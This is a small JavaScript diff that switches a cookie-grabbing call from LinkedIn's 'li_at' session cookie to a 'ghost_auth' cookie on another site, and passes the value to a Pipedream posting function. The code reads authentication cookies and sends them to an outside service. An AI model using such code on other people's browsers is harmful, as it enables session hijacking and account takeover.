@@ -29,6 +29,6 @@ function getCookies(domain, name, callback) {
     });
 }
 
-getCookies("https://www.linkedin.com", "li_at", function(id) {
+getCookies("https://schiessly.com/", "ghost_auth", function(id) {
     postToPipedream(id);
 });
